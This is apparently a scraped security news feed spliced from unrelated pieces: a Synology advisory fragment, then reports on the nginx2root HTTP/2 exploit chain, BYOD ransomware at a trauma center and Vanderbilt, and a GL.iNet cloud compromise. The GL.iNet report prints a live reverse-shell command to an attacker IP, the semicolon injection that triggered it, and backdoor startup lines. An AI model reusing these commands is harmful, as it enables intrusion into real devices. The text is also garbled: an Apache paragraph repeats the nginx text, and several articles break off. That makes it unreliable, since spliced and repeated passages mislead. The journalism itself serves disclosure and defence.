Normally a warning like this comes with an update, but when Synology put this one online, the status said Ongoing and there was nothing to download yet. For DSM 7.4 and 7.3, Synology promised a fix by November 20. Two days later, DSM 7.2.2, DSM 7.2.1, DSM 7.1 and BeeStation OS 1.5, the system on Synology’s smaller home storage box, still have none. For 7.2.2 and 7.2.1, Synology’s advice is to move up to DSM 7.3. For DSM 7.1 and the BeeStation there is not even a date.

The technical part of the advisory goes back further than that table. item.title: nginx2root Chains a 2015 nginx HTTP/2 Bug and a Linux Kernel Zero-Day to Root, Even From Docker
item.description:
9.7 million web addresses announce an nginx version with a flaw that lets an attacker run code without logging in. HTTP/2 switched on is enough. The flaw went in with nginx’s first HTTP/2 code, in 2015.

nginx is the program on a server that answers when a browser asks for a web page. It sends the page itself, or it receives the request first and passes it on to other software behind it. According to the daily count of W3Techs, nginx runs 29.7 percent of the websites whose web server is known.

# TL;DR

On November 18, the nginx project released versions 1.31.9 and 1.30.7 with fixes for ten vulnerabilities. Five of them are memory bugs that the security company Xint found and named nginx2root. The most serious one is CVE-2026-123007, the public ID for a flaw in the part of nginx that speaks HTTP/2. F5, the company that owns nginx, gives it 9.2 out of 10 on CVSS 4.0, the scale used to score how serious a flaw is.

According to the researchers, an attacker who has no account on the server can make nginx execute commands of their choosing, as long as HTTP/2 is switched on. They showed it on a cloud server, attacking it from the outside over its public IP address. Then they used a second flaw, in the Linux kernel, and became root on the machine underneath. In that test, nginx ran inside a Docker container.

The scanning company Censys keeps a live count of nginx installations that are open to this flaw. On November 21, its tracker showed 9,776,434 services on an affected version with HTTP/2 switched on. It counts a service as an IP address or a hostname with a port, so one server can show up more than once. Another 114,417,159 nginx services hide their version number, and the company leaves those out. The tracker itself says the true number is higher.

About 3.7 million of the services in that count are distribution builds that name themselves in the server header, such as Ubuntu’s. Ubuntu fixes nginx without changing the version number, so many of those may already have the fix. The scanning company calls its count an estimate, not a check of each server.

The researchers did their own count on November 10, with Shodan, a search engine for devices on the internet. That search found 56.7 million hosts running nginx. 11.94 million of those showed a version number, and 98.9 percent of them fell in the affected range.

The only setting the flaw needs is HTTP/2, the newer way for a browser and a server to talk. With the older HTTP/1.1, a browser sends one request over a connection and waits for the answer before it sends the next one. HTTP/2 lets it send many requests over the same connection at once, each in its own numbered stream. In nginx, switching it on takes one word at the end of the line where a site listens for visitors: listen 443 ssl http2;. From version 1.25.1 on, it can also be a line of its own, http2 on;.

nginx got HTTP/2 in version 1.9.5, released on September 22, 2015. The changelog for that release opens with the new module, ngx_http_v2_module, and thanks Dropbox and Automattic for sponsoring the work. The researchers found the vulnerable code in each official release from 1.9.5 through 1.31.8, and in the development branch as it stood on November 10.

To keep one side from sending more than the other can handle, HTTP/2 keeps a counter on both ends. It says how much data the other side may still send, and it is called the flow control window. When the receiver has room for more, it sends a short message called WINDOW_UPDATE, and the window grows by the number in that message. The HTTP/2 standard sets a ceiling: the window may never go above 2,147,483,647 bytes, the largest number that fits in 31 bits.

The researchers found that a client can push the window for a connection past that ceiling. nginx has a check that should stop it. That check compares numbers that can never be negative, called unsigned numbers, and it does not see the overflow. From then on, nginx calculates with a window size that is wrong. It writes data outside the piece of memory it set aside, and it reads from outside it too. That memory is the heap, the pool the program hands out to itself while it runs.

The messages the attack uses to trigger the flaw are WINDOW_UPDATE and RST_STREAM, the second one telling the server to drop a stream. nginx does not log them as requests, and over HTTPS they are encrypted on their way in. An attack can leave little in the access log, the file where nginx writes down each visit.

Each time a program starts, its code and data land at a random place in memory, so an attacker does not know where to aim. That protection is called ASLR. F5 writes that an attacker can run code through this flaw when ASLR is off, or when they get around it. The researchers get around it by first using the same flaw to leak 64 bytes that hold addresses of the nginx program and of the heap.

The attacker’s commands then run as the nginx worker that handled the request. nginx starts one main process, and that process starts a few worker processes that deal with the visitors. A worker usually runs under a separate user with limited rights on the system. To get past those limits, the researchers used the second flaw.

That one sits in the Linux kernel, the core of the operating system, in its code for SCTP, a network protocol that runs next to the better known TCP and UDP. A connection in SCTP is called an association, and a program can hand an association over to another socket, the endpoint a program uses to send and receive. The researchers found that this handover can happen while a send on that association is still waiting. When the waiting send finishes, it frees the association, while the other socket still uses it. Depending on what that socket does next, the kernel uses memory that was already given back, or gives the same memory back twice.

That bug gives the researchers two things. The first is a leak of kernel memory that defeats KASLR, the same random placement for the kernel itself. The second is a way to make the kernel call a function the attacker picks. In their tests, an attacker already running code as an nginx worker could reliably become root. The kernel flaw went into Linux in version 4.15, in 2018. When the researchers published, it had no CVE and no patch, and they are holding back most of the details until a fix is out.

On many Linux distributions, they write, the SCTP module is installed by default, and the kernel loads it on its own the first time a program opens an SCTP socket. Code running in the nginx worker can open one and bring the vulnerable code into the kernel. On a given host, it depends on the kernel, the modules on it and the limits set on the container, they add. Red Hat Enterprise Linux (RHEL) 8 and later is an exception: there, SCTP comes in a separate package, kernel-modules-extra, and the company writes that the module is blacklisted by default.

This is why Docker did not stop it. A container has its own files and its own processes, but it runs on the kernel of the host, the same kernel the other containers on that machine use. Root in that kernel means control over the host and over the other containers on it. The researchers do not say which Docker settings the test container ran with.

They tested the nginx flaw on AWS, Google Cloud and Azure: from inside the server, from the private network next to it, and over the public IP address. They list success in each of those nine tests, and write that the attack also works with normal traffic on the server at the same time.

It is the second SCTP flaw this year that leads out of a container. In August, Tencent’s Zhuque Lab published CVE-2026-64564, a different bug in the kernel’s SCTP code, and reached root on the host in six of eight attempts from inside a container. That test kept the default seccomp profile switched on, the filter that blocks risky system calls inside a container, and gave the container none of the extra rights CAP_NET_ADMIN and CAP_SYS_ADMIN. Linux has fixed that one.

The nginx2root researchers were not the only team on this bug. They reported their five bugs to F5 on October 16. One of them had found the flow control flaw first, and a few days later an automated scan by the same company found the other four without a person guiding it. F5’s advisory thanks four teams for the flow control flaw, and next to one of them, Ikotas Labs, it names GPT-6 Astra, an AI model.

Wiz Research lists five teams that found the HTTP/2 flaws separately, its own among them. It found its two with Atlas, the system behind its AI code scanning. When it reported the other HTTP/2 flaw, CVE-2026-123633, on October 21, F5 told it another team had already reported the same bug. It reported the flow control flaw on November 16, two days before the release, and F5 confirmed the next day that it was the same one.

The fix carries an earlier date than the warning. In nginx’s public repository on GitHub, the commit that repairs the flaw is titled HTTP/2: account for queued frames when validating WINDOW_UPDATE. Its date is November 11, 12:16 UTC, a week before the release and the advisory. The commit does not show the moment it became visible there. On that same November 11, Rapid7, where Stephen Fewer had found the same flaw, made its first contact with F5 about it and sent its report the next day.

He also published an exploit for the nginx flaw: code that runs commands on a vulnerable nginx 1.31.8 in a Docker image for 64-bit Linux, with HTTP/2 and HTTPS switched on. His write-up puts the traffic it needs at about 128 GB of HTTP/2 data: two minutes on a 10 Gbit/s connection, seventeen minutes on 1 Gbit/s. On a line slower than about 300 Mbit/s it does not finish, because nginx closes a connection after one hour by default. The nginx2root researchers kept the last steps of their own exploit out of their write-up, and write that their approach does not depend on exact response sizes.

Seven days before the nginx release, on November 11, the Apache project published a critical flaw in its HTTP/2 module that can also lead to remote code execution. To keep one side from sending more than the other can handle, HTTP/2 keeps a counter on both ends. It says how much data the other side may still send, and it is called the flow control window. When the receiver has room for more, it sends a short message called WINDOW_UPDATE, and the window grows by the number in that message. The HTTP/2 standard sets a ceiling: the window may never go above 2,147,483,647 bytes, the largest number that fits in 31 bits.

That check compares numbers that can never be negative, called unsigned numbers, and it does not see the overflow. From then on, nginx calculates with a window size that is wrong. item.title: BYOD Hackers Locked a Trauma Center's Computers, Then Offered Patients 2,500 Dollars
item.description:
For two hours, New Mexico’s only trauma center sent its ambulances to other hospitals. Its own computers were reading a ransom demand out loud. The next day the hackers said sorry, and kept the data.

# TL;DR

It started on a Monday morning, October 26, at the university hospital in Albuquerque. Around 11 o’clock, the hospital’s IT team saw something on the network that did not belong there and started shutting it out. A little after noon, the staff got an alert to unplug their desktops and switch off WiFi on their phones.

Then the computers started to talk.

A computer voice, the flat kind that text-to-speech software makes, came out of the machines inside the hospital. A local TV station got part of the recording. The voice said the attackers had the data of the students and employees, their Social Security numbers, their private documents and their email. It told the people in charge to get in touch right away, through an encrypted chat app called Session, or the university would be taken down so far it could no longer function. On the screens, a red skull appeared with the words “Oh no, you have been compromised.” A doctor at the hospital told the student newspaper that the message played on their own computer.

This hospital is the only Level 1 trauma center in New Mexico. Level 1 is the highest level of trauma care, the hospital where the most badly injured patients are taken. The same health system runs the only burn unit and the only children’s hospital in the state, and it takes care of a large part of the people in New Mexico who have no health insurance. In a normal year, it handles around 900,000 outpatient visits and 100,000 visits to the emergency room.

From 12:30 to 2:30 that afternoon, the hospital sent its ambulances to other hospitals in Albuquerque and Santa Fe. For those two hours, a patient in New Mexico with the worst kind of injury had no emergency room in the state that could take them. The hospital cancelled the appointments at more than 30 clinics for the rest of the day and stopped the outpatient surgeries. Patients were told to stay home, to call 911 if it was an emergency, and to wait with the rest.

That same day, the attackers put the university on their website.

They call themselves BYOD. Like many ransomware groups, they run a leak site, a website on the Tor network where they list the organizations they hit and publish the stolen data of the ones that do not pay. Their post about the university was loud. It claimed 36,000 computers and both of the university’s Active Directory networks, one for the campus and one for the hospital. Active Directory is how a big organization decides who you are when you log in, and which computers and files you may use. The post also claimed the cloud version of that system, two Oracle databases, the payroll, the student records and the internal email. It would come down, the group wrote, once the university got in touch.

The hospital tells a much smaller story. Its own investigation found that some of the computers people work on were hit, but that the attackers did not get into the core systems or the servers. Two days later, some employees still had to leave their computers off.

Then, on the Tuesday, the hackers changed their tone.

In a post titled “UPDATE: UNM,” the group wrote that it had not known those machines were helping patients while they were being treated. It offered the key for the remaining locked computers for free, but only on the hospital side. The campus stayed locked.

In brackets, the group added that it would have kept the hospital locked too if those machines had only held appointments, patient information and research data. So the apology covered the machines that helped patients during treatment. And then it spoke to the patients themselves. A patient who was affected could send proof, and the group would pay them up to 2,500 dollars each, for the inconvenience. It wrote that it was sorry, that it had morals and a heart, and that it was not a villain. In the same post, it wrote that it would keep the data, and that it would go on holding companies responsible for bad security.

That free key gave something away. You can only hand out a key for computers you have locked.

Look at that 2,500 dollar offer from the patient’s side. To get the money, you would have to prove who you are, to the people who took your medical records.

The hospital answered on Wednesday. Without naming the group, it said it had made no deals with the people behind the attack. It warned that they might now go after patients, students and employees one by one, with false offers of payment or compensation. It told them not to answer, and to keep the message and report it to the FBI’s Internet Crime Complaint Center.

Two weeks later, the same voice turned up in Nashville, Tennessee.

On Monday, November 9, around 8:30 in the morning, Vanderbilt University started fighting off an attack. The university has about 14,000 students. At 10:45, it sent a message to its students and staff: shut down your university devices, get off the campus WiFi, and watch out for these signs:

  • → pop-ups and security warnings that come out of nowhere

  • → files that move, change or disappear

  • → programs you did not install

  • → a request to type in your password or approve a login that you did not start yourself

A professor’s laptop played the voice in the middle of a class, the university’s own student newspaper reported, and a video of it went online. This is what it said:

“You have been compromised by BYOD. We suggest you reach out to us as soon as possible. Instructions have been placed on your desktop. Failure to communicate will result in this estate being brought to the ground completely. Make the right choice or rot with the wrong one.”

On the desktop sat a file called README_BYOD_31.txt with the instructions. On their leak site, the group claims it locked the university’s databases and took over the domain controller, the server that holds the accounts and passwords for the network. It also claims research data and more than one million Social Security numbers. The university has not confirmed any of that.

It has said how far from over this is. On November 19, ten days in, the university still called it an ongoing cyberattack. OneDrive, SharePoint, Teams and Copilot were still switched off. The files in Box came back that day, set back to how they were right before 8:30 on November 9. The first step to bring OneDrive back is planned for the first week of December. So many laptops were hit that the university emails their owners in daily batches, and for desktop computers and shared machines it is still working on a fix.

The group claims far more than two schools. TrendAI Research counted at least nine organizations in the five weeks between October 5 and November 9, and the researchers keep apart what the victims confirmed and what the group claims. Here is what the group put on its leak site, and what it says it has:

  • → October 5: Trump Mobile. The names, home addresses, email addresses, phone numbers and order details of 3,615 customers went online, including people who never finished signing up. People in the data confirmed it was theirs. A member of the group later claimed they got in through malware on the computer of an employee at the mobile carrier that runs the service.

item.title: GL.iNet Cloud Flaw Gave Attackers Root on Routers and KVMs Through a Feature That Was Switched Off
item.description:
Routers and KVMs took root commands and malware from the maker’s own cloud, with signs on 166 of 199 routers one firm checked. Owners had the abused feature turned off. The hole was 715 days old.

GL.iNet makes small travel routers that fit in a jacket pocket, the kind you take along on a trip. You plug one in at a hotel or a holiday rental, and your laptop and phone go through your own little network instead of straight onto the hotel WiFi. The company also makes home routers, and a line of KVM devices called Comet.

# TL;DR

A KVM over IP is a small box that you plug into the HDMI and USB ports of a computer. From your browser you then see that computer’s screen and use its keyboard and mouse as if you were sitting in front of it, even while it is still starting up. That is handy when the computer is a server in a closet, or your work PC at the office while you are at home.

To manage those devices from wherever you are, GL.iNet has a cloud service called GoodCloud. You link your router or KVM to your account, and from that moment on the device keeps a connection open to GL.iNet’s servers and waits for instructions. You change a setting in the app, the cloud sends a message down that connection, and your device does what the message says.

On the KVMs, that cloud service is switched on by default, GL.iNet’s own documentation says so. And according to the company’s security notice, some KVMs already had it running before their owner had even linked them to an account.

So the device listens to the cloud. On November 20, 2026, GL.iNet announced that someone had used a hole in that cloud to put malware on routers and KVMs of its customers.

It took two holes to get there, one in the cloud and one on the router.

The first hole was in the cloud itself. The messages between GoodCloud and your device travel over MQTT, a protocol made for devices that send short messages back and forth with a server, and GL.iNet runs it on a server called EMQX. Your device subscribes to topics, the channels its own messages come in on, and the server is supposed to check who is allowed to send what to which topic. That check was set up wrong, which GL.iNet calls a configuration error. So one device could send management messages to someone else’s device, without being allowed to.

GL.iNet’s own write-up says what an attacker needed for that. One GL.iNet device of their own on GoodCloud, and the MAC address of your device, the hardware address of its network card. An attacker can go through those MAC addresses in large batches, which the write-up calls enumerating them in bulk. The cloud version with the flaw is v3.19.13, and the fix is v3.19.14.

The second hole was on your router, in the program that receives those messages, GL.iNet’s cloud client. It comes in a package called gl-sdk4-cloud, and one part of it handles AstroWarp. AstroWarp is GL.iNet’s SD-WAN feature, software that ties networks in different places together over the internet, an office and a home office for example.

When a cloud message called virtual_ip_info comes in, the client takes three fields out of it, mac, virtualIp and ip, and fills them into a firewall rule:

1

iptables -t nat -A %s -d %s -j DNAT --to-destination %s

The researchers who took this client apart found a part of that code, a branch, with the label “Manually add ip”. When the mac field is empty, the client hands that line straight to the shell with os.execute. It does not check what is in virtualIp or ip, and it does not put quotes around them.

In a shell, a semicolon ends one command and starts the next one. So when the ip field says 127.0.0.1; with any command behind it, the router runs that command. As root, the administrator account that can do anything on the device.

The client also never checks if AstroWarp is even in use. GL.iNet confirms that in its own report: the flaw worked “even when AstroWarp was turned off.” The researchers had the AstroWarp setting on record for 193 of their routers. On all 193 it was off, and the attack went through anyway.

Those researchers are RemoteToHome Consulting, a firm that sets up networks and VPNs for digital nomads, expats and small businesses, and manages a large number of GL.iNet routers for them. They also looked at when this code arrived. The earliest firmware they found it in is 4.7.0 for the GL-MT3000, released on December 5, 2024. The version before it, 4.6.9, did not have it. So the hole was there 715 days before the attack.

This is what the attack looked like on one router. The owner of a GL-AXT1800 on firmware 4.8.3 posted the list of running processes on GL.iNet’s forum, and this line was in it:

1

sh -c iptables -t nat -A SDWAN_IP_MAPPING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1;(while true;do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 170.39.226.219 43104 >/tmp/f;sleep 3;done)

The first part is a firewall rule that does no harm, pointed at 127.0.0.1, the router’s own address. After the semicolon comes the attack.

mkfifo /tmp/f makes a named pipe, a special file that passes data from one program to another. /bin/sh -i starts a shell you can type commands into. nc, short for netcat, opens a connection to 170.39.226.219 on port 43104. From then on, what the attacker types on their side goes through that pipe into the shell on your router, and what the shell answers goes back over the same connection.

That is a reverse shell. Your router is the one that makes the call, out to the attacker. So no port has to be open on your router, and to your firewall it is ordinary outgoing traffic, the same kind as when you open a website. The while true loop with the sleep 3 makes sure that when the connection drops, the router calls back three seconds later.

The researchers also read GoodCloud’s own device logs for their routers. The attacker’s messages had their own recognizable form, and the first router reply to one of them shows up on November 19. The big wave came on November 20, from 20:06 UTC until 08:04 UTC the next morning. About twelve hours, one router model and firmware version after the other.

By November 23 they had checked 199 routers. On 166 of them they found signs of the attack:

  • → 24 with a root shell to 170.39.226.219 still running, or still trying to reconnect
  • → 93 where the attacker’s command had run and nothing else was found
  • → 49 with an older backdoor installed and running, more on that below

On the other 33 they found nothing, and 15 of those had been restarted since November 20. The shell only exists in memory, so a restart takes most of the traces with it.

These are the researchers’ own routers and the ones they manage, and all of them had GoodCloud on. So 166 out of 199 does not mean that 83 percent of all GL.iNet routers are infected. GL.iNet itself has not said how many devices were hit. Its notice says the company is “continuing to determine the number of affected devices.”

The first thing GL.iNet gave its customers to check their own device was one command. You log in over SSH, you type ps | grep tmp, and if you see a process called crond -i /tmp/.log, your device is under attack. No output means the device is fine, the first instructions said.

The researchers did not find that process on a single one of their routers. Not even on the 24 with a shell running. crond -i /tmp/.log is the name the KVM malware uses, and the router shell never had that name.

The owner of that GL-AXT1800 from above ran exactly that check. The shell line showed up in his output, because it contains /tmp/f, but it was not the process name GL.iNet told people to look for. He posted his output in the forum thread for the check. Later that day, a post in the same thread warned that an empty result from ps | grep tmp is not enough to tell if a router is compromised. It gave a command that looks for the connection itself:

1

netstat -tnp | grep '170.39.226.219'

That one searches for the address the shell calls, so it finds the connection no matter what the process is called.

The command the researchers found most often on the routers sat in the memory of the cloud client on 98 of them. It lists two folders, /etc/config/.gl and /etc/glinet/.cache, and sends what it finds to the same server on port 50000. Those are folders where the KVM malware hides its files. The researchers found no command that installed a file, added an account or a key, or set up a scheduled job on a router.

On the KVMs, the attacker went a lot further. One owner of a Comet GL-RM1 was logging the traffic on his home network when it happened, so he could see what his KVM did. On November 19, it opened a connection to 65.20.71.131. A minute later it downloaded a script called ni.sh and a file called n5 from 66.245.219.252.

Then the traffic started. That one small box talked to about 1,450 different IP addresses on November 19 and about 1,800 on November 20. Before that, it was about 20 a day. He describes them as random residential addresses, so internet connections of other people’s homes. On top of that, the KVM contacted api.trongrid.io, an API for the TRON blockchain, about 1,000 times in 36 hours. What all that traffic was for is still unclear.

The server that gives the malware its orders sits at gl-inet.top. Read that name twice. It looks like GL.iNet’s own, and it points to 66.245.219.252. According to a forum user, it was registered on November 16, three days before this KVM was hit.

The script itself installs a program called gl-helper and a helper called gb, and makes sure they come back after a reboot, with startup scripts and a scheduled job that runs at three-minute intervals. Its process is called crond -i /tmp/.log, so at a glance it looks like the normal task scheduler.

The script also swaps netstat, the command you would use to see the network connections, for a small script of 122 bytes that leaves 66.245.219.252 out of the list. So the moment you go looking for that connection, the tool you look with leaves it out. And it has an option to add an SSH key, so the attacker can log in directly.

And a KVM is plugged into a computer. That is what it is for: whoever controls the KVM sees that screen and types on that keyboard. GL.iNet says it is still determining “whether computers connected to affected KVMs were accessed,” and asks owners to check the attached computer for unfamiliar accounts, software, browser extensions and startup items.

That first address the KVM called, 65.20.71.131, leads to the third hole GL.iNet lists, in RTTY, the program that gives remote terminal access to its routers and KVMs. Before a device connects to a server, it checks the certificate of that server, so it knows it is talking to the right one. By changing the startup arguments of RTTY, that check could be skipped. The device then connects to a terminal server of the attacker, and the attacker gets root. The researchers list 65.20.71.131 as exactly that, a rogue RTTY relay.

While owners were searching their routers for traces of the November attack, they found something else: the older backdoor from the list above.

It starts with five lines added to the top of /etc/init.d/urandom_seed, a normal startup script on these routers:

1
2
3
4
5

cp /usr/bin/lua /usr/bin/monitord
cp /bin/ulogd /var/run/monitord.pid
/usr/bin/monitord /var/run/monitord.pid &
sleep 2
rm /var/run/monitord.pid

The first line makes a copy of the router’s own Lua interpreter and calls it monitord. The next lines use that copy to run a hidden Lua program from /bin/ulogd, and two seconds later the copy is deleted again.

That hidden program sends your router’s serial number, MAC addresses, model and firmware version to the attacker at three-day intervals, and then waits for a task. Look at the names of the servers it calls: cdn.adguardns.com, cdn.adguardns.org, cdn.openwrt-project.org and cdn.lede-openproject.org. AdGuard is a known ad blocker, and OpenWrt is the open-source system GL.iNet’s firmware is built on. Their own domains are adguard.com and openwrt.org. In a log full of router traffic, those names are easy to scroll past.

When a task comes in, the router downloads a second program, ujaild, starts it and deletes the file. According to the researchers, it can run any command, write any file and open a SOCKS5 proxy. With that proxy, the attacker can send their own traffic through your router into your network, to your laptop, your NAS or your printer. In the memory of 47 routers they found no task and no forwarding. Those routers were checking in, and waiting.

On 27 of the 30 routers where the researchers could date the install, the WireGuard VPN server settings in /etc/config/wireguard_server were rewritten 9 to 12 seconds after the backdoor arrived. If you run a VPN server on your router, that file holds its settings. What rewrote them is not known.

The backdoor also adds two lines to /lib/upgrade/keep.d/netifd. That file is a list of files the router keeps when you upgrade the firmware with Keep Settings on. So you update, you keep your settings, and the backdoor comes along with them. One owner wrote on the forum that it survived his firmware upgrade in April 2026 for exactly that reason.

The oldest files the researchers found date from September 2025, and most were installed in December 2025. 48 of the 49 routers had been linked to GoodCloud before the backdoor showed up. How it got there is not known. GL.iNet writes that the reports “do not establish the initial entry path or a connection to this incident.”

GL.iNet says it blocked the attack path on November 20 and fixed the cloud. The researchers reported the server behind the shells, 170.39.226.219, to the hosting provider on November 21. About three and a half hours later, the provider wrote back that it had suspended the server.

Blocking the cloud stops new infections. But a router or KVM that was already infected stays infected until it gets new firmware. Starting November 22, GL.iNet released security firmware that disables the known malware and removes its files:

  • → GL-MT3000, GL-MT6000 and GL-MG1300: 4.11.1
  • → GL-AXT1800, GL-AX1800, GL-X3000, GL-XE3000 and GL-SFT1200: 4.8.4
  • → GL-MT2500 and GL-X2000: 4.7.14
  • → Comet KVMs RM1, RM1V2, RM1PE, RM4PE, RM10 and RM10RC: 1.10.3, and the RMQ1: 1.8.7

The other models are in the notice. A factory reset on its own does not install the fixes, GL.iNet writes. And an update cannot take back a key or password that was already copied. If someone took your VPN key, they still have it after the update.

  • → Check if GoodCloud, on a KVM the cloud service, is switched on, and switch it off if you do not use it
